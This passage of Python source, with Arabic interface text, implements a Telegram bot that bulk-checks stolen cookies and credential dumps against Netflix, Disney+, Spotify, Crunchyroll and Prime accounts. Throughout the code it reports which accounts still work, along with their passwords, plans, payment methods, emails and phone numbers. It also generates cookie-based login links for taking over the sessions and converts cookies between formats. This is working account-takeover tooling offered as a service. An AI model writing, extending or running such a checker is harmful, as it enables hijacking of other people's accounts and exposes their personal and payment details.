        # fallback to passed login_link if no raw cookies stored
        if not info.get('_cookies_raw'):
            pc_link = phone_link = login_link

        lines = [f"🎬 **NETFLIX ACCOUNT** 🎬\n"]

        # password from file
        if info.get('_password'):
            lines.append(f"🔑 **Password:** `{info['_password']}`")

        def add(icon, label, key, always=False, fallback='N/A'):
            val = v(key, fallback)
            if always or val not in ('N/A', '', None):
                lines.append(f"{icon} **{label}:** {val}")

        add('🟢', 'Status',        'status',        always=True)
        add('🌍', 'Region',        'region')
        add('⏰', 'Member Since',  'member_since')
        add('⭐', 'Plan',          'plan')
        add('💳', 'Payment',       'payment')
        add('📅', 'Next Billing',  'next_billing')
        add('🎭', 'Profiles',      'profiles')

        # Email + verified
        email_val = v('email')
        lines.append(f"✉️ **Email:** {email_val}")
        lines.append(f"     └ {v('email_verified', '❓ Unknown')}")

        # Phone + verified
        ph = v('phone')
        lines.append(f"📱 **Phone:** {ph}")
        if ph not in ('N/A', None):
            lines.append(f"     └ {v('phone_verified', '❓ Unknown')}")

        add('👥', 'Extra Members', 'extra_members', always=True, fallback='No ❌')
        add('🌐', 'Display Language', 'language')

        lines.append(f"\n[💻 CLICK HERE TO LOGIN IN PC]({pc_link})")
        lines.append(f"[📱 CLICK HERE TO LOGIN IN PHONE]({phone_link})")
        return '\n'.join(lines)

    if platform_id == 'prime':
        lines = [
            f"{p['emoji']} **{p['name']} ACCOUNT** {p['emoji']}\n",
            f"🟢 **Status:** {v('status')}",
        ]
        if v('name') != 'N/A':
            lines.append(f"👤 **Name:** {v('name')}")
        if v('email') != 'N/A':
            lines.append(f"✉️ **Email:** {v('email')}")
        lines += [
            f"⭐ **Plan:** {v('plan')}",
            f"⏰ **Member Since:** {v('member_since')}",
            f"📅 **Next Billing:** {v('next_billing')}",
            f"💳 **Payment:** {v('payment')}",
            f"🌍 **Region:** {v('region')}",
        ]
        if info.get('_password'):
            lines.insert(1, f"🔑 **Password:** `{info['_password']}`")
        lines.append(f"\n[🔗 CLICK HERE TO LOGIN 💜]({login_link})")
        return '\n'.join(lines)

    return (
        f"{p['emoji']} **{p['name']} ACCOUNT** {p['emoji']}\n\n"
        f"🟢 **Status:** {info['status']}\n\n"
        f"[🔗 CLICK HERE TO LOGIN 💜]({login_link})"
    )

# ─── File Bulk Checker ───────────────────────────────────────────────────────

def _stop_markup(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_bulk:{user_id}")
    ]])

def _resume_markup(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("▶️ استئناف الفحص", callback_data=f"resume_bulk:{user_id}")
    ]])


async def process_bulk_file(message, context: ContextTypes.DEFAULT_TYPE,
                             content: str, platform_id: str,
                             user_id: int = 0, username: str = ''):
    accounts = split_accounts(content)
    total    = len(accounts)

    if total == 0:
        await message.reply_text("❌ لم أجد أي حسابات في الملف.")
        return

    # Register a stop event for this user
    stop_event = asyncio.Event()
    ACTIVE_JOBS[user_id] = stop_event

    p = PLATFORMS[platform_id]
    progress_msg = await message.reply_text(
        f"📂 تم العثور على **{total}** حساب في الملف\n"
        f"🔍 جاري الفحص على {p['emoji']} **{p['name']}**...\n\n"
        f"⏳ `0/{total}` تم فحصها",
        parse_mode='Markdown',
        reply_markup=_stop_markup(user_id)
    )

    valid_results = []
    invalid_count = 0
    stopped       = False

    for i, block in enumerate(accounts, 1):
        # Check stop flag
        if stop_event.is_set():
            stopped = True
            break

        parsed = parse_account_block(block)
        cookies, _ = parse_cookies(parsed['cookie_text'])

        if not cookies:
            # Fallback: try entire raw block as cookies
            cookies, _ = parse_cookies(block)

        if not cookies:
            invalid_count += 1
            continue

        info, reason = await asyncio.to_thread(fetch_account_info, platform_id, cookies)
        link = build_login_link(platform_id, parsed['cookie_text'] or block)
        db_record_check(user_id, platform_id, info is not None, link if info else '')

        if info:
            ext = parsed.get('extracted', {})
            # Fill N/A fields from file metadata
            MERGE_FIELDS = {
                'email'         : ['email'],
                'plan'          : ['plan'],
                'member_since'  : ['member_since'],
                'next_billing'  : ['next_billing'],
                'region'        : ['country'],
                'phone'         : ['phone'],
                'profiles'      : ['profiles'],
                'payment'       : ['payment_method'],
                'email_verified': ['email_verified'],
                'phone_verified': ['phone_verified'],
                'extra_members' : ['extra_members'],
            }
            for info_key, ext_keys in MERGE_FIELDS.items():
                if info.get(info_key, 'N/A') in ('N/A', '', None):
                    for ek in ext_keys:
                        if ext.get(ek):
                            info[info_key] = ext[ek]
                            break
            # Extra fields only in file
            if ext.get('video_quality'):
                info['video_quality'] = ext['video_quality']
            if ext.get('max_streams'):
                info['max_streams'] = ext['max_streams']
            # Attach email/password for display
            if parsed['email'] and info.get('email', 'N/A') == 'N/A':
                info['email'] = parsed['email']
            info['_password'] = parsed['password']
            info['_file'] = ext
            info['_cookies_raw'] = parsed['cookie_text'] or block
            valid_results.append((i, info, link, parsed))
        else:
            invalid_count += 1

        # Update progress every 3 accounts or on last
        if i % 3 == 0 or i == total:
            try:
                filled = int((i / total) * 10)
                bar    = '█' * filled + '░' * (10 - filled)
                await progress_msg.edit_text(
                    f"📂 **{total}** حساب في الملف\n"
                    f"🔍 {p['emoji']} **{p['name']}**\n\n"
                    f"`[{bar}]` `{i}/{total}`\n"
                    f"✅ صالح: `{len(valid_results)}`  ❌ غير صالح: `{invalid_count}`",
                    parse_mode='Markdown',
                    reply_markup=_stop_markup(user_id)
                )
            except Exception:
                pass

    # Cleanup stop event
    ACTIVE_JOBS.pop(user_id, None)

    # ── Final Summary ──
    checked = (i - 1) if stopped else total
    summary = (
        f"━━━━━━━━━━━━━━━\n"
        f"{'⛔ **تم إيقاف الفحص**' if stopped else '📊 **نتيجة الفحص النهائية**'}\n"
        f"━━━━━━━━━━━━━━━\n"
        f"{p['emoji']} **المنصة:** {p['name']}\n"
        f"📂 **الحسابات المفحوصة:** `{checked}/{total}`\n"
        f"✅ **صالح:** `{len(valid_results)}`\n"
        f"❌ **غير صالح:** `{invalid_count}`\n"
        f"━━━━━━━━━━━━━━━"
    )
    try:
        await progress_msg.edit_text(summary, parse_mode='Markdown', reply_markup=None)
    except Exception:
        await message.reply_text(summary, parse_mode='Markdown')

    # ── Send each valid account separately ──
    for idx, info, link, parsed in valid_results:
        header = f"**#️⃣ الحساب #{idx}**"
        if parsed['email']:
            header += f"\n📧 `{parsed['email']}`"
        if parsed['password']:
            header += f"\n🔑 `{parsed['password']}`"
        msg = header + "\n\n" + build_result_message(platform_id, info, link)
        try:
            await message.reply_text(msg, parse_mode='Markdown',
                                     disable_web_page_preview=False)
            await asyncio.sleep(0.4)
        except Exception:
            pass

    if not valid_results:
        await message.reply_text("😔 لم يتم العثور على أي حساب صالح في الملف.")

# ─── Command Handlers ─────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db_update_user(update.effective_user.id, update.effective_user.username)
    await update.message.reply_text(
        "Welcome to my bot\n"
        "Prof: @QKCQQ\n"
        "Please send cookies to get URL"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db_update_user(update.effective_user.id, update.effective_user.username)
    await update.message.reply_text(
        "📖 **Available Commands:**\n\n"
        "▶️ /start — Start the bot\n"
        "❓ /help — Show this help message\n"
        "🔄 /convert — Convert cookies to all formats\n"
        "📜 /history — View your last 10 checks\n"
        "📊 /stats — Bot statistics *(admin only)*\n\n"
        "━━━━━━━━━━━━━━━\n"
        "**Supported Platforms:**\n"
        "🎬 Netflix  🏰 Disney+  🎵 Spotify  🍥 Crunchyroll\n\n"
        "**How to use:**\n"
        "• Send cookies as text → single account check\n"
        "• Send a `.txt` or `.json` file → bulk check all accounts\n\n"
        "**File format for bulk check:**\n"
        "Separate accounts using `---` between each one.",
        parse_mode='Markdown'
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ هذا الأمر للأدمن فقط.")
        return
    total_users, total_checks, valid_checks, platform_rows = db_get_stats()
    invalid = total_checks - valid_checks
    lines = [
        "📊 **Bot Statistics**\n",
        f"👥 Total Users: `{total_users}`",
        f"🔍 Total Checks: `{total_checks}`",
        f"✅ Valid: `{valid_checks}`",
        f"❌ Invalid: `{invalid}`\n",
        "**By Platform:**",
    ]
    for pname, count in platform_rows:
        emoji = PLATFORMS.get(pname, {}).get('emoji', '🔹')
        lines.append(f"{emoji} {pname.capitalize()}: `{count}`")
    await update.message.reply_text('\n'.join(lines), parse_mode='Markdown')

async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db_update_user(update.effective_user.id, update.effective_user.username)
    rows = db_get_history(update.effective_user.id)
    if not rows:
        await update.message.reply_text("📜 لا يوجد سجل بعد. أرسل كوكيز للبدء!")
        return
    lines = ["📜 **Your Last Checks:**\n"]
    for platform, valid, link, ts in rows:
        emoji  = PLATFORMS.get(platform, {}).get('emoji', '🔹')
        status = '✅ Valid' if valid else '❌ Invalid'
        lines.append(f"{emoji} **{platform.capitalize()}** — {status}")
        lines.append(f"     🕐 {ts}")
        if valid and link:
            lines.append(f"     [🔗 Login Link]({link})")
        lines.append("")
    await update.message.reply_text(
        '\n'.join(lines), parse_mode='Markdown', disable_web_page_preview=True
    )

async def convert_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db_update_user(update.effective_user.id, update.effective_user.username)
    context.user_data['convert_mode'] = True
    await update.message.reply_text(
        "🔄 **Cookie Converter**\n\n"
        "أرسل الكوكيز الآن وسأحولها إلى **كل الصيغ** (JSON, Netscape, key=value):",
        parse_mode='Markdown'
    )

# ─── Callback: Platform selection ────────────────────────────────────────────

async def handle_platform_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query       = update.callback_query
    await query.answer()
    data        = query.data          # e.g. "single:netflix" or "bulk:netflix"
    user_id     = query.from_user.id
    username    = query.from_user.username

    if ':' not in data:
        await query.edit_message_text("❌ خيار غير معروف.")
        return

    mode, platform_id = data.split(':', 1)

    # ── Stop bulk job ──
    if mode == 'stop_bulk':
        target_uid = int(platform_id)
        if target_uid in ACTIVE_JOBS:
            ACTIVE_JOBS[target_uid].set()
            await query.answer("⛔ تم طلب الإيقاف…")
            try:
                await query.edit_message_reply_markup(reply_markup=None)
            except Exception:
                pass
        else:
            await query.answer("لا يوجد فحص جارٍ حالياً.")
        return

    # ── Resume bulk job (placeholder – re-send file to resume) ──
    if mode == 'resume_bulk':
        await query.answer("لإعادة الفحص، أرسل الملف من جديد.")
        return

    # ── Bulk file mode ──
    if mode == 'bulk':
        file_content = context.user_data.pop('pending_file', '')
        if not file_content:
            await query.edit_message_text("❌ انتهت الجلسة. أرسل الملف من جديد.")
            return
        await query.edit_message_text(
            f"⏳ جاري فحص الملف على {PLATFORMS[platform_id]['emoji']} "
            f"**{PLATFORMS[platform_id]['name']}**...",
            parse_mode='Markdown'
        )
        await process_bulk_file(query.message, context, file_content, platform_id,
                                user_id, username)
        return

    # ── Single cookie mode ──
    cookies_raw = context.user_data.pop('pending_cookies', '')
    if not cookies_raw:
        await query.edit_message_text("❌ انتهت الجلسة. أرسل الكوكيز من جديد.")
        return

    await query.edit_message_text(
        f"⏳ جاري فحص حساب {PLATFORMS[platform_id]['name']}...",
        parse_mode='Markdown'
    )
    cookies, _ = parse_cookies(cookies_raw)
    info, reason = await asyncio.to_thread(fetch_account_info, platform_id, cookies)
    login_link   = build_login_link(platform_id, cookies_raw)

    db_update_user(user_id, username)
    db_record_check(user_id, platform_id, info is not None, login_link if info else '')

    if info is None:
        err = ERROR_MESSAGES.get(reason, ERROR_MESSAGES['error'])
        await query.edit_message_text(err, parse_mode='Markdown')
        return

    info['_cookies_raw'] = cookies_raw
    msg = build_result_message(platform_id, info, login_link)
    await query.edit_message_text(msg, parse_mode='Markdown', disable_web_page_preview=False)

# ─── Platform keyboard helper ─────────────────────────────────────────────────

def platform_keyboard(mode):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🎬 Netflix",     callback_data=f'{mode}:netflix'),
            InlineKeyboardButton("🏰 Disney+",     callback_data=f'{mode}:disney'),
        ],
        [
            InlineKeyboardButton("🎵 Spotify",     callback_data=f'{mode}:spotify'),
            InlineKeyboardButton("🍥 Crunchyroll", callback_data=f'{mode}:crunchyroll'),
        ],
    ])

# ─── Document / File Handler ─────────────────────────────────────────────────

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id  = update.effective_user.id
    username = update.effective_user.username
    db_update_user(user_id, username)

    doc = update.message.document
    allowed_exts = ('.txt', '.json', '.cookies', '.dat', '.log')
    if doc.file_name and not any(doc.file_name.lower().endswith(e) for e in allowed_exts):
        await update.message.reply_text(
            "⚠️ يرجى إرسال ملف نصي (.txt, .json, .cookies)"
        )
        return

    if doc.file_size and doc.file_size > 5 * 1024 * 1024:
        await update.message.reply_text("⚠️ الملف كبير جداً. الحد الأقصى 5 ميجابايت.")
        return

    wait_msg = await update.message.reply_text("📂 جاري قراءة الملف...")

    try:
        tg_file = await doc.get_file()
        with tempfile.NamedTemporaryFile(delete=False, suffix='.tmp') as tmp:
            await tg_file.download_to_drive(tmp.name)
            with open(tmp.name, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
        os.unlink(tmp.name)
    except Exception as e:
        await wait_msg.edit_text(f"❌ فشل قراءة الملف: {e}")
        return

    if not content.strip():
        await wait_msg.edit_text("❌ الملف فارغ!")
        return

    accounts    = split_accounts(content)
    total       = len(accounts)
    platform_id = None

    # Try to detect platform from first valid account
    for block in accounts[:3]:
        cookies, _ = parse_cookies(block)
        if cookies:
            platform_id = detect_platform(cookies)
            if platform_id:
                break

    await wait_msg.delete()

    if platform_id:
        await update.message.reply_text(
            f"📂 تم العثور على **{total}** حساب\n"
            f"🔍 تم اكتشاف المنصة: {PLATFORMS[platform_id]['emoji']} **{PLATFORMS[platform_id]['name']}**\n\n"
            f"جاري بدء الفحص...",
            parse_mode='Markdown'
        )
        await process_bulk_file(update.message, context, content, platform_id,
                                user_id, username)
    else:
        context.user_data['pending_file'] = content
        await update.message.reply_text(
            f"📂 تم العثور على **{total}** حساب في الملف\n\n"
            "🤔 لم أتمكن من تحديد المنصة تلقائياً.\nاختر المنصة:",
            parse_mode='Markdown',
            reply_markup=platform_keyboard('bulk')
        )

# ─── Text Message Handler ─────────────────────────────────────────────────────

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text     = update.message.text
    user_id  = update.effective_user.id
    username = update.effective_user.username
    db_update_user(user_id, username)

    # ── Convert mode ──
    if context.user_data.get('convert_mode'):
        context.user_data.pop('convert_mode')
        cookies, detected_fmt = parse_cookies(text)
        if not cookies:
            await update.message.reply_text("❌ لم أتمكن من قراءة الكوكيز.")
            return
        fmt_names = {'json': 'JSON Array', 'netscape': 'Netscape',
                     'keyvalue': 'key=value', 'unknown': 'Unknown'}
        json_fmt, kv_fmt, ns_fmt = convert_to_all_formats(cookies)
        await update.message.reply_text(
            f"🔄 **Detected:** `{fmt_names.get(detected_fmt)}`  |  "
            f"🍪 **Cookies:** `{len(cookies)}`",
            parse_mode='Markdown'
        )
        await update.message.reply_text(
            f"**📋 JSON Format:**\n```\n{json_fmt[:3500]}\n```", parse_mode='Markdown')
        await update.message.reply_text(
            f"**📋 Key=Value Format:**\n```\n{kv_fmt[:3500]}\n```", parse_mode='Markdown')
        await update.message.reply_text(
            f"**📋 Netscape Format:**\n```\n{ns_fmt[:3500]}\n```", parse_mode='Markdown')
        return

    # ── Normal single-account check ──
    cookies, _ = parse_cookies(text)
    if not cookies:
        await update.message.reply_text(
            "❌ لم أتمكن من قراءة الكوكيز. تأكد من الصيغة وأعد الإرسال."
        )
        return

    platform_id = detect_platform(cookies)

    if platform_id:
        await update.message.reply_text(
            f"⏳ تم اكتشاف **{PLATFORMS[platform_id]['name']}** "
            f"{PLATFORMS[platform_id]['emoji']} — جاري الفحص...",
            parse_mode='Markdown'
        )
        info, reason = await asyncio.to_thread(fetch_account_info, platform_id, cookies)
        login_link   = build_login_link(platform_id, text)
        db_record_check(user_id, platform_id, info is not None, login_link if info else '')

        if info is None:
            err = ERROR_MESSAGES.get(reason, ERROR_MESSAGES['error'])
            await update.message.reply_text(err, parse_mode='Markdown')
            return
        info['_cookies_raw'] = text
        msg = build_result_message(platform_id, info, login_link)
        await update.message.reply_text(
            msg, parse_mode='Markdown', disable_web_page_preview=False
        )
    else:
        context.user_data['pending_cookies'] = text
        await update.message.reply_text(
            "🤔 لم أتمكن من تحديد المنصة تلقائياً.\nاختر المنصة:",
            reply_markup=platform_keyboard('single')
        )

# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    if not TOKEN:
        raise ValueError("TELEGRAM_BOT_TOKEN غير موجود.")
    init_db()
    print("جاري تشغيل البوت...")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start",   start))
    app.add_handler(CommandHandler("help",    help_command))
    app.add_handler(CommandHandler("stats",   stats_command))
    app.add_handler(CommandHandler("history", history_command))
    app.add_handler(CommandHandler("convert", convert_command))
    app.add_handler(CallbackQueryHandler(handle_platform_choice))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("✅ البوت يعمل الآن!")
    app.run_polling()

if __name__ == '__main__':
    main()
